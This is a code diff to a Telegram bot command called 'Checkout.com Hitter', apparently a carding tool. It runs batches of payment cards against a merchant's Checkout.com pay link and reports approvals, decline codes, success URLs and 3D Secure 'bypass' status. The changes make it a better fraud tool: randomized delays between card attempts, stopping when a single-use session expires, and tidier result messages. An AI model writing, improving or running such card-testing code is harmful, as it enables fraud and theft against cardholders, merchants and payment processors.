@@ -811,7 +811,8 @@ async def hitck_command(message: types.Message):
         return
 
     status_msg = await message.answer("cooking....")
-    active_sessions[user_id] = True
+    session_token = time.time()
+    active_sessions[user_id] = session_token
     
     try:
         from checkout_hitter import CheckoutHitter
@@ -824,8 +825,12 @@ async def hitck_command(message: types.Message):
         results = []
 
         for idx, card in enumerate(cards, 1):
-            if user_id not in active_sessions:
+            if active_sessions.get(user_id) != session_token:
                 break
+                
+            if idx > 1:
+                await asyncio.sleep(random.uniform(0.5, 1.0))
+                
             res = await checkout_engine.hit(card, idx, user_id)
             results.append(res)
             
@@ -847,12 +852,20 @@ async def hitck_command(message: types.Message):
                     resp_str = res.get('error') or res.get('decline_code') or "Refused"
 
                 block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(resp_str)}"
+                succ_url_line = extract_success_url_line(res)
+                if succ_url_line:
+                    block += succ_url_line
                 
                 card_blocks.append(block)
 
                 site_line = f"Site: {html.escape(merchant_name)} ({html.escape(site_domain)})" if site_domain else f"Site: {html.escape(merchant_name)}"
                 amt_line = f"\nAmount: {html.escape(amount_str)}" if amount_str else ""
-                blocks_text = "\n\n".join(card_blocks)
+                
+                # Sliding window guard to avoid 4096-char Telegram message crash
+                visible_blocks = card_blocks
+                while len("\n\n".join(visible_blocks)) > 3500 and len(visible_blocks) > 1:
+                    visible_blocks = visible_blocks[1:]
+                blocks_text = "\n\n".join(visible_blocks)
 
                 msg_text = (
                     f"<b>Checkout.com Hitter</b>\n\n"
@@ -865,6 +878,20 @@ async def hitck_command(message: types.Message):
                     await status_msg.edit_text(msg_text, disable_web_page_preview=True)
                 except Exception:
                     pass
+
+            # Halt batch immediately if single-use pay link has expired
+            if is_session_expired_err(res) or res.get('session_expired'):
+                if len(cards) > 1 and status_msg:
+                    try:
+                        await status_msg.edit_text(
+                            f"<b>Checkout.com Hitter</b>\n\n"
+                            f"{blocks_text}\n\n"
+                            f"⚠️ <b>[!] Session Expired</b>",
+                            disable_web_page_preview=True
+                        )
+                    except Exception:
+                        pass
+                break
 
         is_approved = user_id in approved_users_set
 
@@ -886,7 +913,6 @@ async def hitck_command(message: types.Message):
                 if res.get('3ds_resolved') or res.get('3ds_bypassed'):
                     resp_str += " (3DS Bypassed)"
                 
-                receipt_str = ""
                 succ_url = res.get('receipt_url') or res.get('final_url') or res.get('redirect_url') or res.get('success_url') or res.get('3ds_url')
                 succ_url_line = f"\n<b><i>Success URL</i></b> ➔ {html.escape(str(succ_url))}" if succ_url else ""
                 
@@ -930,11 +956,12 @@ async def hitck_command(message: types.Message):
         import traceback
         traceback.print_exc()
         if status_msg:
-            await status_msg.edit_text(f"<b>Fatal Error</b>\n<code>{str(e)}</code>")
+            try: await status_msg.edit_text(f"<b>Fatal Error</b>\n<code>{str(e)}</code>")
+            except: pass
         else:
             await message.answer(f"<b>Fatal Error</b>\n<code>{str(e)}</code>")
     finally:
-        if user_id in active_sessions:
+        if active_sessions.get(user_id) == session_token:
             del active_sessions[user_id]
 
 
